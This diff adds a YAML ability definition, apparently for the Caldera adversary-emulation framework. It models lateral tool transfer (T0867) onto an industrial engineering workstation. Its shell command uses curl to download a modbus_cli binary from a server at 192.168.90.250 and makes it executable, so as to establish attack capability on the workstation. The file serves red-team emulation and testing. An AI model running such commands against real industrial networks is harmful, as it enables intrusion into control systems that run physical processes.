@@ -1,0 +1,20 @@
+---
+
+- id: e5f6a7b8-5555-5555-5555-000000000002
+  name: Lateral Transfer - Modbus CLI to EWS
+  description: |
+    Download the modbus_cli binary from Caldera server to the
+    engineering workstation, establishing attack capability on a
+    trusted ICS network host.
+  tactic: lateral-movement
+  technique_id: T0867
+  technique_name: Lateral Tool Transfer
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -X POST -H "file:modbus_cli" -H "platform:linux"
+      http://192.168.90.250:8888/file/download -o ./modbus_cli &&
+      chmod +x ./modbus_cli &&
+      echo "TOOL_TRANSFERRED: modbus_cli" &&
+      ls -la ./modbus_cli
